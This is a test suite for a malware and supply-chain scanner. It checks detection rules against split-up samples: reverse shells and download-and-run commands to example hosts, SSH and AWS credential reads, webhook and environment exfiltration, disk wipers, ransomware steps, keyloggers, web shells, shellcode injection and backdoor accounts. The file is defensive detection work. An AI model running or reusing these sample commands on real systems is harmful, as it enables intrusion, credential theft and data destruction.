// veyra-guard-ignore-file: these tests contain sample attacks (assembled at runtime) on purpose.
import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
const g = createRequire(import.meta.url)("../out/scanner.js");

// Samples of malicious code are assembled from pieces so this file never contains a working payload.
const j = (...parts) => parts.join("");
const rules = (text, path = "src/index.js", opts) => g.scan(text, path, opts).map(f => f.rule);
const has = (text, rule, path) => assert.ok(rules(text, path).includes(rule), `expected ${rule} in ${JSON.stringify(text).slice(0, 120)}; got ${JSON.stringify(rules(text, path))}`);
const clean = (text, path) => assert.deepEqual(rules(text, path), [], `expected nothing in ${JSON.stringify(text).slice(0, 120)}`);

test("Trojan Source and invisible characters", () => {
  has(j('if (accessLevel != "user', "\u202E", ' \u2066// Check if admin\u2069 \u2066") {'), "trojan-source");
  has(j("const is", "\u200B", "Admin = true;"), "invisible-character");
  const f = g.scan(j("let a", "\u202E", "b = 1;"), "a.ts")[0];
  assert.equal(f.line, 1); assert.equal(f.column, 6);
  assert.match(f.message, /<U\+202E>/);
  clean("\uFEFFconst ok = 1; // a byte order mark at the very start is normal", "a.js");
  clean("Café, naïve, 日本語 and emoji 🚀 are fine in strings: 'déjà vu'", "a.js");
});

test("look-alike letters in names, but not in strings or comments", () => {
  has(j("function p", "\u0430", "ypal() { return send(); }"), "homoglyph");
  clean('const greeting = "Привет"; // Русский комментарий', "a.js");
  clean("const π = Math.PI;", "a.js");
});

test("code hidden far to the right", () => {
  has(j("const ok = true;", " ".repeat(180), "require('child_process').exec(x)"), "hidden-far-right");
  clean("const ok = true;   // a normal comment", "a.js");
});

test("decoding and running hidden code", () => {
  has(j("ev", "al(at", "ob('ZG9jdW1lbnQ='))"), "eval-decoded");
  has(j("new Func", "tion(Buffer.from(data, 'base", "64').toString())()"), "eval-decoded");
  has(j("ev", "al(String.fromCh", "arCode(97,108))"), "eval-decoded");
  has(j("ex", "ec(base64.b64de", "code(blob))"), "python-exec", "tool.py");
  has(j("__imp", "ort__('o", "s').sys", "tem('id')"), "python-exec", "tool.py");
  has(j("ev", "al(function(p,a,c,k,e,d){return 1})"), "packed-code");
  clean("const decoded = atob(token); JSON.parse(decoded);", "a.js");
  clean("setTimeout(() => render(), 100);", "a.js");
});

test("download-and-run, reverse shells, miners", () => {
  has(j("cu", "rl -fsSL http://example.test/i.sh | ba", "sh"), "download-execute", "setup.sh");
  has(j("powershell -c \"i", "ex (New-Object Net.Web", "Client).Download", "String('http://x.test/a')\""), "download-execute", "run.ps1");
  has(j("certu", "til -url", "cache -f http://x.test/a.exe a.exe"), "download-execute", "run.bat");
  has(j("bash -i >& /dev/", "tcp/203.0.113.5/4444 0>&1"), "reverse-shell", "x.sh");
  has(j("n", "c -e /bin/sh 203.0.113.5 4444"), "reverse-shell", "x.sh");
  has(j("pty.sp", "awn('/bin/bash')"), "reverse-shell", "x.py");
  has(j("const pool = 'stra", "tum+tcp://pool.example:3333';"), "crypto-miner");
  has(j("spawn('./x", "mrig', ['-o', pool]);"), "crypto-miner");
  clean("curl -fsSL https://example.com/data.json -o data.json", "fetch.sh");
  clean("Install with: curl -fsSL https://get.example.com | sh", "README.md");
});

test("stealing credentials and data", () => {
  has(j("fs.readFileSync(os.homedir() + '/.ss", "h/id_rsa')"), "credential-theft");
  has(j("const p = path.join(home, '.aws/credent", "ials');\nconst data = fs.readFileSync(p);"), "credential-theft");
  // Naming a sensitive path without reading it (a list of files to protect, a .gitignore) is fine.
  clean(j("const sensitive = ['.env', '.ss", "h/id_rsa', '.aws/credent", "ials'];\nassert(isSensitive(sensitive[1]));"), "a.js");
  clean(j("mkdir(base.join('.ss", "h'));"), "a.rs");
  has(j("fetch('https://discord.com/api/web", "hooks/123/abc', { method: 'POST' })"), "exfil-endpoint");
  has(j("requests.post('https://api.telegram.org/b", "ot123:abc/sendMessage', data=d)"), "exfil-endpoint", "x.py");
  has(j("body: JSON.stringify(process.", "env)"), "env-exfil");
  has(j("payload = json.dumps(dict(os.envi", "ron))"), "env-exfil", "x.py");
  clean("const port = process.env.PORT ?? 3000;", "a.js");
  clean("api_key = os.environ['API_KEY']", "a.py");
  clean(".npmrc\nnode_modules/", ".gitignore");
});

test("persistence and turning off defences", () => {
  has(j("(cron", "tab -l; echo '* * * * * /tmp/x') | cron", "tab -"), "persistence", "x.sh");
  has(j("scht", "asks /create /tn updater /tr C:\\x.exe /sc onlogon"), "persistence", "x.bat");
  has(j("echo 'curl x' >> ~/.bash", "rc"), "persistence", "x.sh");
  has(j("Set-MpPref", "erence -DisableRealtimeMonitoring $true"), "disable-defences", "x.ps1");
  has(j("power", "shell -w hidden -nop -c Get-Date"), "hidden-powershell", "x.bat");
  has(j("power", "shell -enc ", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"), "hidden-powershell", "x.bat");
  has("const agent = new https.Agent({ rejectUnauthorized: false });", "insecure-tls");
  clean("crontab -e opens your schedule", "notes.md");
});

test("obfuscation signals and bare IP addresses", () => {
  has(`const s = String.fromCharCode(${Array.from({ length: 20 }, (_, i) => 97 + i).join(",")});`, "char-code-obfuscation");
  has(`const s = "${"\\x41".repeat(30)}";`, "hex-escapes");
  has(`const blob = "${"QUJD".repeat(100)}";`, "base64-blob");
  has(j("fetch('http://198.51", ".100.7:8080/c')"), "raw-ip-url");
  clean("fetch('http://127.0.0.1:3000/api'); fetch('http://192.168.1.5/'); fetch('http://10.0.0.2')", "a.js");
  clean(`"integrity": "sha512-${"A".repeat(86)}=="`, "package-lock.json");
});

test("leaked secrets", () => {
  has(j("const key = 'AKI", "AQ4XN7ZK2PB9RW3TY';"), "secret");
  has(j("token = 'gh", "p_", "Zq8vT2mLx9Rk4Wn7Hc1Yb5Pd3Fg6Js0EaQuV", "'"), "secret");
  has(j("-----BEGIN RSA PRIV", "ATE KEY-----\n", "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun"), "secret", "deploy.pem.txt");
  // Samples and placeholders are not reported.
  clean(j("const key = 'AKI", "AIOSFODNN7EXAMPLE';"), "a.js");
  clean(j("token = 'gh", "p_", "a".repeat(36), "'"), "a.js");
  clean(j("token = 'gh", "p_", "abcdefghijklmnopqrstuvwxyz0123456789", "'"), "a.js");
  clean(j("assert(looksLikeSecret('-----BEGIN RSA PRIV", "ATE KEY-----'));"), "a.js");
  const f = g.scan(j("const key = 'AKI", "AQ4XN7ZK2PB9RW3TY';"), "a.js")[0];
  assert.ok(!f.message.includes("Q4XN7ZK2PB9RW3TY"), "the full secret is not repeated in the message");
  clean("const AKIA_PREFIX_DOCS = 'see the AWS docs';", "a.js");
});

test("poisoned npm install scripts", () => {
  const pkg = s => `{\n  "name": "x",\n  "scripts": {\n    ${s}\n  }\n}`;
  has(pkg(j('"postinstall": "cu', 'rl -s http://x.test/p | sh"')), "install-script", "package.json");
  has(pkg(j('"preinstall": "node -', 'e \\"require(\'child_process\')\\""')), "install-script", "package.json");
  assert.deepEqual(rules(pkg('"postinstall": "node scripts/build-native.js"'), "package.json"), ["install-hook"]);
  clean(pkg('"build": "tsc -p ."'), "package.json");
});

test("GitHub workflow attacks", () => {
  const wf = ".github/workflows/ci.yml";
  has(j("      - run: echo \"$", "{{ github.event.issue.title }}\""), "workflow-injection", wf);
  has(j("on: pull_request_target\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: $", "{{ github.event.pull_request.head.sha }}"), "workflow-pr-target", wf);
  clean(j("on: pull_request\njobs:\n  b:\n    steps:\n      - run: echo \"$", "{{ github.sha }}\""), wf);
  assert.deepEqual(rules(j("run: echo $", "{{ github.event.issue.title }}"), "src/notes.yml"), [], "only workflow files");
});

test("lines can be marked as reviewed", () => {
  const bad = j("fetch('http://198.51", ".100.7/c')");
  assert.deepEqual(rules(`${bad} // veyra-guard-ignore`), []);
  assert.deepEqual(rules(`// veyra-guard-ignore: raw-ip-url\n${bad}`), []);
  assert.deepEqual(rules(`// veyra-guard-ignore: secret\n${bad}`), ["raw-ip-url"], "ignoring a different rule doesn't hide this one");
});

test("a whole file can opt out, but a pull request that adds an opt-out is reported", () => {
  const bad = j("fetch('http://198.51", ".100.7/c')");
  assert.deepEqual(rules(`// veyra-guard-ignore-file: sample attacks for tests\n${bad}`), []);
  assert.deepEqual(rules(`${bad}\n\n\n\n\n// veyra-guard-ignore-file`), ["raw-ip-url"], "only in the first five lines");
  // In a pull request (only new lines checked), adding an opt-out is itself a finding.
  assert.deepEqual(rules(`// veyra-guard-ignore-file\n${bad}`, "a.js", { onlyLines: new Set([1, 2]) }), ["guard-opt-out"]);
  assert.deepEqual(rules(`${bad} // veyra-guard-ignore`, "a.js", { onlyLines: new Set([1]) }), ["guard-opt-out"]);
  assert.deepEqual(rules(`${bad} // veyra-guard-ignore`, "a.js", { onlyLines: new Set([2]) }), [], "an opt-out that was already there isn't reported again");
});

test("byte order marks are not flagged", () => {
  clean(j("assert.deepEqual(parseCsv('", "﻿", "a,b'), [['a','b']]);"), "test/csv.test.js");
});

test("options: disabled rules, minimum severity, only some lines", () => {
  const text = [j("fetch('http://198.51", ".100.7/c')"), j("ev", "al(at", "ob(x))")].join("\n");
  assert.deepEqual(rules(text, "a.js", { disabled: ["raw-ip-url"] }), ["eval-decoded"]);
  assert.deepEqual(rules(text, "a.js", { minSeverity: "critical" }), ["eval-decoded"]);
  assert.deepEqual(rules(text, "a.js", { onlyLines: new Set([1]) }), ["raw-ip-url"]);
});

test("reads which lines a pull request adds", () => {
  const patch = "@@ -1,3 +1,4 @@\n line one\n-old two\n+new two\n+added three\n line four\n@@ -10,2 +11,2 @@\n context\n+late add";
  assert.deepEqual([...g.addedLines(patch)].sort((a, b) => a - b), [2, 3, 12]);
});

test("binary and huge files are skipped; every rule explains itself", () => {
  assert.deepEqual(g.scan("\u0000\u0001\u0002 binary " + j("stra", "tum+tcp://x"), "a.bin"), []);
  for (const r of g.ruleList()) { assert.ok(r.why.length > 40, `${r.id} explains why`); assert.ok(g.SEVERITIES.includes(r.severity)); }
  assert.equal(new Set(g.ruleList().map(r => r.id)).size, g.ruleList().length, "rule ids are unique");
});

test("hostile input can't freeze the scanner (no catastrophic backtracking)", () => {
  const nasty = [
    "'" + "\\".repeat(20000),                       // unclosed string full of backslashes
    "\"" + "\\\"".repeat(10000),                    // escaped quotes, never closed
    "x" + " ".repeat(15000) + "\t".repeat(5000),    // huge whitespace run with nothing after it
    "eval(" + "a".repeat(15000),
    "curl " + "a ".repeat(9000),
    "${{ github.event." + "x.".repeat(8000),
  ];
  for (const line of nasty) {
    const t = Date.now();
    g.scan(line, "src/a.js"); g.scan(line, ".github/workflows/x.yml"); g.scan(`{"scripts":{"postinstall":"${line.slice(0, 5000)}"}}`, "package.json");
    assert.ok(Date.now() - t < 1500, `took ${Date.now() - t}ms on ${JSON.stringify(line.slice(0, 20))}…`);
  }
});

test("supply chain: look-alike packages, URL dependencies, extra indexes, unpinned versions", () => {
  const pkg = deps => JSON.stringify({ name: "x", version: "1.0.0", scripts: { build: "tsc -p ." }, dependencies: deps, devDependencies: { tyepscript: "^5.0.0" } }, null, 2);
  const found = text => g.scan(text, "package.json").map(f => `${f.rule}:${f.line}`);
  assert.deepEqual(found(pkg({ expres: "^4.18.2", react: "^18.2.0", preact: "^10.0.0", color: "^4.2.3" })), ["typosquat-package:8", "typosquat-package:14"], "expres and tyepscript, not react/preact/color");
  assert.deepEqual(found(pkg({ mylib: "git+https://github.com/a/b.git", other: "https://example.com/x.tgz" })), ["remote-dependency:8", "remote-dependency:9", "typosquat-package:12"]);
  assert.deepEqual(found(pkg({ "left-pad": "*", chalk: "latest" })), ["unpinned-dependency:8", "unpinned-dependency:9", "typosquat-package:12"]);
  assert.deepEqual(found(JSON.stringify({ name: "x", version: "1.0.0" }, null, 2)), [], "the package's own fields are not dependencies");
  const req = t => g.scan(t, "requirements.txt").map(f => `${f.rule}:${f.line}`);
  assert.deepEqual(req("reqeusts==2.31.0\nnumpy>=1.26\nboto==2.49\n"), ["typosquat-package:1"]);
  assert.deepEqual(req("--extra-index-url https://pkgs.example.com/simple\nflask==3.0.0\n"), ["dependency-confusion:1"]);
  assert.deepEqual(req("git+https://github.com/a/b.git#egg=b\n"), ["remote-dependency:1"]);
  assert.equal(g.editDistance("express", "expres"), 1);
  assert.equal(g.editDistance("typescript", "tyepscript"), 1, "a swap of two letters is one edit");
});

test("every finding says how to fix it", () => {
  for (const r of g.ruleList()) assert.ok(r.fix && r.fix.length > 30, `${r.id} has fix guidance`);
  const f = g.scan(j("ev", "al(at", "ob(x))"), "a.js")[0];
  assert.match(f.fix, /Replace eval/);
});

test("grade: score, letter and verdict", () => {
  const sev = s => ({ severity: s });
  assert.deepEqual([g.grade([]).letter, g.grade([]).score], ["A", 100]);
  assert.equal(g.grade([sev("low"), sev("low")]).letter, "A");
  assert.equal(g.grade([sev("medium"), sev("medium"), sev("medium")]).letter, "B");
  assert.equal(g.grade([sev("high")]).letter, "B");
  assert.equal(g.grade([sev("critical")]).letter, "D", "one critical caps the grade at D");
  assert.equal(g.grade([sev("critical"), sev("critical"), sev("high")]).letter, "F");
  assert.match(g.grade([sev("critical")]).verdict, /Action needed/);
});

test("documentation is only checked for hidden characters and leaked keys", () => {
  const doc = [j("| Reverse shells | `bash -i >& /dev/", "tcp/1.2.3.4/4444` |"), j("Example: `ev", "al(at", "ob(x))`")].join("\n");
  assert.deepEqual(rules(doc, "docs/attacks.md"), []);
  has(j("Note: ", "\u202E", " hidden"), "trojan-source", "README.md");
  has(j("key: AKI", "AQ4XN7ZK2PB9RW3TY"), "secret", "notes.txt");
});

test("web shells in PHP, ASP, JSP, Node.js, Python and Ruby", () => {
  has(j("<?php ev", "al($_PO", "ST['c']); ?>"), "webshell", "upload/x.php");
  has(j("<?php sys", "tem($_GE", "T['cmd']); ?>"), "webshell", "x.php");
  has(j("<?php $_GE", "T['f']($_GET['a']); ?>"), "webshell", "x.php");
  has(j("<% ev", "al(Request.Form(\"c\")) %>"), "webshell", "x.aspx");
  has(j("Runtime.getRuntime().ex", "ec(request.getParameter(\"c\"));"), "webshell", "x.jsp");
  has(j("app.get('/x', (req, res) => ex", "ec(req.query.cmd));"), "webshell", "server.js");
  has(j("os.sys", "tem(request.args.get('c'))"), "webshell", "app.py");
  has(j("sys", "tem(params[:cmd])"), "webshell", "app/controllers/x_controller.rb");
  clean("<?php echo htmlspecialchars($_GET['name']); ?>", "x.php");
  clean("const id = req.query.id; db.find(id);", "server.js");
});

test("hidden code is decoded and run in many languages", () => {
  has(j("<?php ev", "al(gzinf", "late(base64_dec", "ode('eJzLSM3JyQcABiwCFQ=='))); ?>"), "eval-decoded", "x.php");
  has(j("ev", "al(Base64.dec", "ode64(payload))"), "eval-decoded", "x.rb");
  has(j("ev", "al(decode_b", "ase64($blob));"), "eval-decoded", "x.pl");
  has(j("loadstr", "ing(dec", "ode_base64(s))()"), "eval-decoded", "x.lua");
  has(j("Assembly.Lo", "ad(Convert.FromBase64", "String(b));"), "eval-decoded", "x.cs");
  clean("assert.equal(atob('aGk='), 'hi');", "test/a.test.js");
  clean("// load the atob polyfill first", "a.js");
});

test("code downloaded and run at run time", () => {
  has(j("ex", "ec(requests.g", "et('https://x.test/p.py').text)"), "remote-code-load", "x.py");
  has(j("ev", "al(await (await fet", "ch('https://x.test/a.js')).text());"), "remote-code-load", "x.js");
  has(j("loadstr", "ing(game:Http", "Get('https://x.test/s.lua'))()"), "remote-code-load", "x.lua");
  has(j("ev", "al(file_get_con", "tents('https://x.test/s.txt'));"), "remote-code-load", "x.php");
  has(j("pickle.lo", "ads(requests.g", "et(u).content)"), "remote-code-load", "x.py");
  clean("const data = JSON.parse(await (await fetch(url)).text());", "a.js");
  clean("cfg = json.load(urlopen(url))", "a.py");
});

test("wipers, ransomware and protestware", () => {
  has(j("rm -r", "f / --no-preserve-root"), "destructive-command", "x.sh");
  has(j("rm -r", "f ~"), "destructive-command", "x.sh");
  has(j("rm -r", "f \"$HOME\""), "destructive-command", "x.sh");
  has(j("dd if=/dev/ze", "ro of=/dev/sda bs=1M"), "destructive-command", "x.sh");
  has(j(":(){ :|:& ", "};:"), "destructive-command", "x.sh");
  has(j("del /f /s /q ", "C:\\*"), "destructive-command", "x.bat");
  has(j("shutil.rmt", "ree(os.path.expanduser('~'))"), "destructive-command", "x.py");
  has(j("fs.rmS", "ync(os.homedir(), { recursive: true, force: true });"), "destructive-command", "x.js");
  has(j("CreateFile(\"\\\\\\\\.\\\\Physical", "Drive0\", GENERIC_WRITE, 0, 0, 3, 0, 0);"), "destructive-command", "x.c");
  clean("rm -rf /tmp/build-cache ./dist ~/.cache/x", "clean.sh");
  clean("rm -rf node_modules/", "clean.sh");
  clean("del /q C:\\temp\\old.log", "x.bat");
  clean("shutil.rmtree(tmpdir)", "x.py");
  has(j("vssadmin del", "ete shadows /all /quiet"), "ransomware", "x.bat");
  has(j("bcdedit /set {default} recoverye", "nabled no"), "ransomware", "x.bat");
  has(j("note = 'Your files have been encr", "ypted! Send 0.5 bitcoin to recover them.'"), "ransomware", "x.py");
});

test("spyware: keyloggers and clipboard hijackers", () => {
  has(j("from pynput import keyb", "oard\ndef on_press(k):\n    requests.post(URL, data=str(k))"), "keylogger", "x.py");
  has(j("if (GetAsyncKe", "yState(i) & 1) fprintf(log, \"%c\", i);"), "keylogger", "x.c");
  clean("if (GetAsyncKeyState(VK_SPACE)) player.jump();", "game.cpp");
  const clipper = j("import pyperclip, re\nBTC = re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$')\nif BTC.match(pyperclip.paste()):\n    pyperclip.copy('1BoatSLRHtKNngkdXEeobR76b53LETtpyT')");
  assert.deepEqual(g.scan(clipper, "x.py").filter(f => f.rule === "clipboard-hijack").map(f => f.line), [2, 4]);
  clean("const addr = '0x52908400098527886E0F7030069857D2E4169EE7'; // donation address", "a.js");
});

test("native malware: shellcode, process injection, executable memory, anti-debugging", () => {
  has(j("unsigned char buf[] = \"\\xfc\\x48\\x83\\xe4", "\\xf0\\xe8\\xc0\\x00\";"), "shellcode", "x.c");
  has(j("byte[] buf = new byte[] { 0xfc, 0x48, 0x83, 0xe4", ", 0xf0, 0xe8 };"), "shellcode", "x.cs");
  has(j("HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);\nLPVOID m = VirtualAllocEx(h, 0, n, 0x3000, 0x40);\nWriteProcessMem", "ory(h, m, buf, n, 0);\nCreateRemoteThr", "ead(h, 0, 0, m, 0, 0, 0);"), "process-injection", "x.c");
  has(j("addr = ctypes.windll.kernel32.VirtualAl", "loc(0, len(sc), 0x3000, 0x40)"), "exec-memory", "x.py");
  has(j("void *p = mmap(0, n, PROT_READ | PROT_WRITE | PROT_E", "XEC, MAP_PRIVATE | MAP_ANON, -1, 0);"), "exec-memory", "x.c");
  has(j("if (IsDebugger", "Present()) ExitProcess(0);"), "anti-analysis", "x.c");
  clean("SetThreadContext(thread, &ctx); // our own debugger, no other process opened", "dbg.c");
  clean("void *p = mmap(0, n, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);", "x.c");
});

test("Office macros, SQL and build scripts", () => {
  const macro = j("Sub AutoOpen()\n  Dim s\n  Set s = CreateObject(\"WScript.She", "ll\")\n  s.Run \"powershell -c Get-Date\"\nEnd Sub");
  assert.deepEqual(g.scan(macro, "x.bas").filter(f => f.rule === "office-macro").map(f => f.line), [3, 4]);
  clean("Sub FormatReport()\n  Range(\"A1\").Font.Bold = True\nEnd Sub", "x.bas");
  has(j("EXEC xp_cmd", "shell 'whoami';"), "sql-command-exec", "x.sql");
  has(j("COPY t FROM PROG", "RAM 'id';"), "sql-command-exec", "x.sql");
  has(j("import os\nos.sys", "tem('curl -s http://x.test/a | sh')\nsetup(name='x')"), "build-time-execution", "setup.py");
  has(j("let body = reqwe", "st::blocking::get(\"https://x.test/p\");"), "build-time-execution", "build.rs");
  has(j("import base64;exe", "c(base64.b64decode('cHJpbnQoMSk='))"), "build-time-execution", "site-packages/evil.pth");
  clean("exec(open('pkg/version.py').read())\nsubprocess.check_call(['cmake', '..'])\nsetup(name='x')", "setup.py");
  clean("import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'", "distutils-precedence.pth");
  clean("./some/path/to/add", "x.pth");
});

test("backdoor accounts and hard-coded logins", () => {
  has(j("echo 'ssh-ed25519 AAAA attacker' >> ~/.ssh/authorized_", "keys"), "persistence", "x.sh");
  has(j("net user support P@ssw0rd /a", "dd"), "persistence", "x.bat");
  has(j("echo /tmp/x.so > /etc/ld.so.prel", "oad"), "persistence", "x.sh");
  has(j("if (password === \"letmein", "2024\") return grantAdmin();"), "hardcoded-login", "src/auth.js");
  has(j("if (strcmp(passwd, \"backdo", "or!\") == 0) return 1;"), "hardcoded-login", "auth.c");
  clean("if (passwordType === \"text\") show();", "src/form.js");
  clean("if (password === \"hunter22\") ok();", "test/auth.test.js");
});

test("zero-width joiners in emoji and other scripts are fine; between plain letters they are not", () => {
  clean("const team = '\u{1F469}\u200D\u{1F4BB} and \u{1F468}\u200D\u{1F469}\u200D\u{1F467}';", "a.js");
  clean("const fa = '\u0645\u06CC\u200C\u062E\u0648\u0627\u0647\u0645';", "a.js");
  has(j("const is", "\u200D", "Admin = true;"), "invisible-character");
  const { text, removed } = g.removeHiddenCharacters(j("const a", "\u200B", "b = '\u{1F469}\u200D\u{1F4BB}';\nlet x", "\u202E", " = 1;"));
  assert.equal(removed, 2);
  assert.equal(text, "const ab = '\u{1F469}\u200D\u{1F4BB}';\nlet x = 1;");
});

test("languages are recognised by name and extension", () => {
  const cases = { "a.php": "PHP", "x/Main.java": "Java", "lib.rs": "Rust", "Dockerfile": "Docker", "Dockerfile.prod": "Docker", "build.gradle": "Groovy", "a.ps1": "PowerShell", "x.sol": "Solidity", "requirements-dev.txt": "Python", ".bashrc": "Shell script", "macro.bas": "Visual Basic", "README.md": "Markdown", "a.unknownext": undefined };
  for (const [p, l] of Object.entries(cases)) assert.equal(g.languageOf(p), l, p);
  assert.ok(g.LANGUAGES.length >= 70, `${g.LANGUAGES.length} languages`);
  assert.deepEqual(g.languageCounts(["a.js", "b.js", "c.py", "d.unknown"]), [["JavaScript", 2], ["Python", 1]]);
});

test("custom rules from a team's settings or .veyra-guard.json", () => {
  const customRules = [{ id: "no-internal-host", pattern: "internal\\.corp\\.example", severity: "medium", title: "Internal host name", fix: "Use the public API." }, { id: "php-only", pattern: "mysql_query", files: "*.php" }];
  const f = g.scan("fetch('https://internal.corp.example/x')", "src/a.ts", { customRules });
  assert.deepEqual(f.map(x => [x.rule, x.severity, x.title, x.fix]), [["no-internal-host", "medium", "Internal host name", "Use the public API."]]);
  assert.deepEqual(rules("mysql_query($q);", "a.js", { customRules }), [], "files limits where a rule applies");
  assert.deepEqual(rules("mysql_query($q);", "web/a.php", { customRules }), ["php-only"]);
  assert.deepEqual(rules("x internal.corp.example", "notes.md", { customRules }), ["no-internal-host"], "custom rules also check documentation");
  assert.deepEqual(rules("// veyra-guard-ignore: no-internal-host\nfetch('https://internal.corp.example/x')", "a.ts", { customRules }), [], "and can be ignored like any rule");
  assert.match(g.compileCustomRules([{ id: "bad", pattern: "(" }]).errors[0], /invalid pattern/);
  assert.match(g.compileCustomRules([{ id: "empty", pattern: ".*" }]).errors[0], /every line/);
  const { config, error } = g.parseConfig('// team settings\n{ "minSeverity": "medium", "failOn": "critical", "ignorePaths": ["docs/**"], "disabledRules": ["raw-ip-url"], "customRules": [], "junk": 1 }');
  assert.equal(error, undefined);
  assert.deepEqual(config, { minSeverity: "medium", failOn: "critical", ignorePaths: ["docs/**"], disabledRules: ["raw-ip-url"], customRules: [] });
  assert.match(g.parseConfig("{ nope").error, /isn't valid JSON/);
  const m = g.globMatcher(["docs/**", "*.min.js"]);
  assert.ok(m("docs/a/b.md") && m("web/x.min.js") && !m("src/docs.ts"));
});
